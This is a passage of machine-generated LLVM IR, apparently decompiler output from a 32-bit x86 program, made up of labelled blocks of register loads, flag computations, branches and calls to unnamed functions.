  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_804f660()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805248b.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_804f660()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049496, %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_8050089(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805021e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
